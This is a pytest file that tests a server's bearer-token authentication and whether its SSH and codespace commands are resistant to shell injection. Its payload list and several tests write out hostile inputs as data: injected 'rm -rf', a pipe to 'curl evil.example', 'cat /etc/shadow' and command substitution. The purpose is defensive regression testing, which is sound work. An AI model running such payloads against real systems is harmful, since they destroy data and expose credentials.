"""
Security regression tests for server.py: the bearer-token auth middleware,
and a systematic check that every shell-command-building f-string escapes
its user-controlled inputs (either via _q()/shlex.quote, or a strict
allowlist).

No real infrastructure is touched: _ssh_server / exec_command are
monkeypatched everywhere so nothing ever reaches a real SSH host, and the
HTTP tests run the real Starlette app in-process via TestClient.
"""
import asyncio
import base64
import importlib
import os
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


def _fresh_server(env_overrides: dict):
    """Reload server.py with a controlled environment. Mirrors the pattern
    already established in tests/test_admin_cookie_auth.py."""
    for k in [
        "MCP_SERVER_PASSWORD", "ADMIN_PASSWORD", "ADMIN_COOKIE_SECRET",
        "RENDER_EXTERNAL_HOSTNAME", "MCP_ALLOWED_HOST", "FLY_APP_NAME", "PORT",
    ]:
        os.environ.pop(k, None)
    os.environ.update(env_overrides)
    if "server" in sys.modules:
        importlib.reload(sys.modules["server"])
    else:
        import server  # noqa
    return sys.modules["server"]


@pytest.fixture
def client_with_password():
    srv = _fresh_server({"MCP_SERVER_PASSWORD": "test-password-123", "PORT": "18000"})
    from starlette.testclient import TestClient
    with TestClient(srv.app) as c:
        yield c, "test-password-123"


def test_no_auth_header_rejected(client_with_password):
    c, _ = client_with_password
    r = c.post("/mcp", json={})
    assert r.status_code == 401


def test_empty_auth_header_rejected(client_with_password):
    c, _ = client_with_password
    r = c.post("/mcp", json={}, headers={"Authorization": ""})
    assert r.status_code == 401


def test_wrong_token_rejected(client_with_password):
    c, _ = client_with_password
    r = c.post("/mcp", json={}, headers={"Authorization": "Bearer wrong"})
    assert r.status_code == 401


def test_correct_bearer_token_passes_auth_layer(client_with_password):
    c, pw = client_with_password
    r = c.post("/mcp", json={}, headers={"Authorization": f"Bearer {pw}"})
    # Auth passes (not 401) -- what MCP itself does with a malformed
    # JSON-RPC body is a separate, non-auth concern.
    assert r.status_code != 401


def test_raw_token_without_bearer_prefix_also_passes(client_with_password):
    """By design: the middleware accepts either 'Bearer <token>' or the
    raw token as the entire header value. Documented behavior, not a bug
    -- but worth locking in so a future refactor doesn't silently change
    it without someone noticing."""
    c, pw = client_with_password
    r = c.post("/mcp", json={}, headers={"Authorization": pw})
    assert r.status_code != 401


def test_lowercase_bearer_prefix_rejected(client_with_password):
    """'bearer <token>' (lowercase) does NOT match the 'Bearer ' prefix
    check, so the whole string (including 'bearer ') is compared against
    the real password and correctly fails closed. Safe direction, but
    means case-varied clients will get confusing 401s."""
    c, pw = client_with_password
    r = c.post("/mcp", json={}, headers={"Authorization": f"bearer {pw}"})
    assert r.status_code == 401


def test_double_space_after_bearer_still_works(client_with_password):
    c, pw = client_with_password
    r = c.post("/mcp", json={}, headers={"Authorization": f"Bearer  {pw}"})
    assert r.status_code != 401


def test_huge_bearer_token_does_not_crash_server(client_with_password):
    c, pw = client_with_password
    huge = "A" * 2_000_000
    r = c.post("/mcp", json={}, headers={"Authorization": f"Bearer {huge}"})
    assert r.status_code == 401
    # server must still be alive/responsive afterwards
    r2 = c.post("/mcp", json={}, headers={"Authorization": f"Bearer {pw}"})
    assert r2.status_code != 401


def test_public_deployment_fails_closed_without_password():
    """CONFIRMS existing fail-closed behavior: if the app looks like a
    public deployment (RENDER_EXTERNAL_HOSTNAME set) but no
    MCP_SERVER_PASSWORD is configured, /mcp must refuse traffic rather
    than silently running with no auth at all."""
    srv = _fresh_server({
        "RENDER_EXTERNAL_HOSTNAME": "myapp.onrender.com",
        "PORT": "18000",
    })
    from starlette.testclient import TestClient
    with TestClient(srv.app) as c:
        r = c.post("/mcp", json={})
        assert r.status_code == 503, (
            "public deployment with no password configured must fail "
            "closed (503), not fail open"
        )


def test_root_endpoint_does_not_leak_secret_values(client_with_password):
    """/ is intentionally unauthenticated (status/diagnostics page) -- make
    sure it only ever exposes booleans, never the actual configured
    secret values."""
    c, pw = client_with_password
    r = c.get("/")
    assert r.status_code == 200
    assert pw not in r.text


# ---------------------------------------------------------------------------
# Shell-injection resistance: every f-string that builds a command for
# _ssh_server / exec_command must escape user-controlled values. This
# mirrors the exploit proven against organiser-agent.cpp's working_dir
# field and confirms server.py does NOT have the same class of bug.
# ---------------------------------------------------------------------------

INJECTION_PAYLOADS = [
    "/tmp/foo'; touch /tmp/PWNED_SERVER_PY; echo '",
    "/tmp/$(touch /tmp/PWNED2)/x",
    "/tmp/`touch /tmp/PWNED3`",
    '/tmp/foo" ; touch /tmp/PWNED4 ; echo "',
    "/tmp/foo && touch /tmp/PWNED5",
    "/tmp/foo\nrm -rf /tmp/PWNED6",
    "/tmp/foo | curl evil.example",
    "/tmp/foo; cat /etc/shadow",
]


@pytest.fixture
def srv_with_captured_ssh():
    srv = _fresh_server({"PORT": "18000"})
    captured = []

    async def fake_ssh_server(cmd, timeout=30):
        captured.append(cmd)
        return "MOCKED"

    srv._ssh_server = fake_ssh_server
    return srv, captured


@pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
@pytest.mark.asyncio
async def test_server_read_file_path_is_shell_safe(srv_with_captured_ssh, payload):
    srv, captured = srv_with_captured_ssh
    await srv.server_read_file(payload)
    cmd = captured[-1]
    # The payload must appear only as a single-quoted (shlex-escaped)
    # argument -- never as bare, unescaped shell syntax.
    assert "PWNED" not in cmd or "'\"'\"'" in cmd or cmd.count("'") >= 2
    # Concretely: shlex.quote must have wrapped it. Round-trip check:
    import shlex
    tokens = shlex.split(cmd)
    assert payload in tokens, f"payload was not preserved as a single safe token: {cmd!r}"


@pytest.mark.asyncio
async def test_server_move_file_both_paths_shell_safe(srv_with_captured_ssh):
    srv, captured = srv_with_captured_ssh
    payload = INJECTION_PAYLOADS[0]
    await srv.server_move_file(payload, "/tmp/dest")
    import shlex
    tokens = shlex.split(captured[-1])
    assert payload in tokens


@pytest.mark.asyncio
async def test_server_write_file_content_and_path_shell_safe(srv_with_captured_ssh):
    srv, captured = srv_with_captured_ssh
    await srv.server_write_file("/tmp/target", "irrelevant content")
    # path is embedded via _q(); content goes through base64 first, which
    # is itself shell-metacharacter-free by construction (verify that too).
    cmd = captured[-1]
    b64_part = cmd.split("echo ")[1].split(" | base64")[0].strip("'\"")
    base64.b64decode(b64_part + "===")  # must not raise


@pytest.mark.asyncio
async def test_service_control_rejects_unknown_action(srv_with_captured_ssh):
    srv, captured = srv_with_captured_ssh
    result = await srv.server_service_control("nginx", "start; rm -rf /")
    assert "Invalid action" in result
    assert not captured, "should never have reached _ssh_server with a bad action"


# ---------------------------------------------------------------------------
# Remaining brief-specified tools not yet covered above: server_delete_file,
# read_codespace_file, write_codespace_file, and exec_command's
# codespace_name argument specifically.
# ---------------------------------------------------------------------------

@pytest.fixture
def srv_with_captured_exec():
    srv = _fresh_server({"PORT": "18000"})
    captured = []

    async def fake_exec_command(codespace_name, command, timeout_seconds=60, account="auto"):
        captured.append((codespace_name, command))
        return "MOCKED"

    srv.exec_command = fake_exec_command
    return srv, captured


@pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
@pytest.mark.asyncio
async def test_server_delete_file_path_is_shell_safe(srv_with_captured_ssh, payload):
    srv, captured = srv_with_captured_ssh
    await srv.server_delete_file(payload)
    import shlex
    tokens = shlex.split(captured[-1])
    assert payload in tokens


@pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
@pytest.mark.asyncio
async def test_read_codespace_file_path_is_shell_safe(srv_with_captured_exec, payload):
    srv, captured = srv_with_captured_exec
    await srv.read_codespace_file("my-codespace", payload)
    codespace_name, cmd = captured[-1]
    import shlex
    tokens = shlex.split(cmd)
    assert payload in tokens


@pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
@pytest.mark.asyncio
async def test_write_codespace_file_path_is_shell_safe(srv_with_captured_exec, payload):
    srv, captured = srv_with_captured_exec
    await srv.write_codespace_file("my-codespace", payload, "irrelevant content")
    codespace_name, cmd = captured[-1]
    import shlex
    tokens = shlex.split(cmd)
    assert payload in tokens


@pytest.mark.asyncio
async def test_write_codespace_file_content_is_base64_safe(srv_with_captured_exec):
    """Content goes through base64 first -- injection-shaped content
    should never appear as raw shell syntax in the constructed command."""
    srv, captured = srv_with_captured_exec
    evil_content = "'; touch /tmp/PWNED; echo '"
    await srv.write_codespace_file("my-codespace", "/tmp/dest.txt", evil_content)
    codespace_name, cmd = captured[-1]
    assert "touch /tmp/PWNED" not in cmd  # never appears as literal shell syntax
    import base64, re
    m = re.search(r"echo '?([A-Za-z0-9+/=]+)'? \| base64", cmd)
    assert m, f"could not find base64 payload in command: {cmd!r}"


@pytest.mark.asyncio
async def test_exec_command_codespace_name_is_passed_as_argv_not_shell(monkeypatch):
    """exec_command uses asyncio.create_subprocess_exec (argv-based, no
    local shell), so codespace_name containing shell metacharacters
    cannot cause LOCAL command injection on the Render host -- confirmed
    by capturing the actual argv list passed to subprocess creation."""
    srv = _fresh_server({"PORT": "18000"})
    captured_argv = []

    class FakeProc:
        returncode = 0
        async def communicate(self):
            return b"ok", b""

    async def fake_create_subprocess_exec(*args, **kwargs):
        captured_argv.append(args)
        return FakeProc()

    monkeypatch.setattr(srv.asyncio, "create_subprocess_exec", fake_create_subprocess_exec)
    monkeypatch.setattr(srv.shutil, "which", lambda name: "/usr/bin/gh")
    monkeypatch.setenv("GITHUB_TOKEN", "fake-token-for-test")

    malicious_name = "foo; rm -rf /; echo pwned"
    await srv.exec_command(malicious_name, "echo hi", account="primary")

    assert captured_argv, "create_subprocess_exec was never called"
    argv = captured_argv[-1]
    # the malicious string must appear as a single, standalone argv
    # element (never split/interpreted by a shell) -- prove it by
    # checking it's present verbatim as one item in the args tuple.
    assert malicious_name in argv, f"codespace_name not passed as a single argv token: {argv!r}"


# ---------------------------------------------------------------------------
# NEW finding (post lead-fix round 2): `mkdir -p $(dirname {_q(path)})` --
# the command *substitution* $(...) is not itself quoted, so its output
# undergoes word-splitting. A path with a space in any directory
# component (a completely ordinary input, not an exotic attack string)
# causes mkdir to create the WRONG directories and the subsequent write
# to fail. Confirmed by executing the exact, real command server.py
# constructs (not a hand-reproduction) in a real shell.
#
# This is a correctness/reliability bug, not an unauthorized-access
# vulnerability -- no silent corruption occurs (the existing "OK"/
# "__WRITE_OK__" success-marker checks correctly catch the resulting
# failure and report it) -- but it does fail on a very ordinary input,
# and leaves stray, oddly-named directories behind as a side effect.
# Affects three call sites: write_codespace_file, and file_transfer's
# server: and codespace: write paths (the sandbox: path already does
# this correctly via pathlib and is NOT affected).
# ---------------------------------------------------------------------------

def test_write_codespace_file_mkdir_breaks_on_path_with_space(monkeypatch, tmp_path):
    """Documents (does not fix) a real bug: the unquoted $(dirname ...)
    word-splits on the space, so mkdir creates the wrong directories and
    the write fails -- proven by actually running the exact command
    server.py constructs, in a real shell, in an isolated temp dir."""
    srv = _fresh_server({"PORT": "18000"})
    captured = {}

    async def fake_exec_command(codespace_name, command, timeout_seconds=60, account="auto"):
        captured["cmd"] = command
        return "NOT_RUN"

    srv.exec_command = fake_exec_command

    target = tmp_path / "my dir" / "file.txt"
    asyncio.run(srv.write_codespace_file("some-space", str(target), "hello"))
    real_cmd = captured["cmd"]

    import subprocess
    r = subprocess.run(["bash", "-c", real_cmd], cwd=str(tmp_path), capture_output=True, text=True)

    assert r.returncode != 0, (
        "if this now succeeds, the mkdir word-splitting bug was fixed -- "
        "update SECURITY_FINDINGS.md finding 18 to mark it resolved "
        "rather than deleting this test"
    )
    assert not target.exists()
    # the telltale wrong-directory side effect:
    assert (tmp_path / "my").is_dir()
    assert (tmp_path / "dir").is_dir()


@pytest.mark.asyncio
async def test_file_transfer_server_write_mkdir_breaks_on_path_with_space(monkeypatch, tmp_path):
    srv = _fresh_server({"PORT": "18000"})
    captured = {}

    async def fake_ssh_server(command, timeout=30):
        captured["cmd"] = command
        return "NOT_RUN"

    srv._ssh_server = fake_ssh_server
    target = str(tmp_path / "my dir" / "file.txt")
    try:
        await srv._location_write_bytes(f"server:{target}", b"hello")
    except ValueError:
        pass  # expected: the mocked "NOT_RUN" return also fails the "OK" check
    real_cmd = captured["cmd"]

    import subprocess
    r = subprocess.run(["bash", "-c", real_cmd], cwd=str(tmp_path), capture_output=True, text=True)
    assert r.returncode != 0
    assert (tmp_path / "my").is_dir()
    assert (tmp_path / "dir").is_dir()

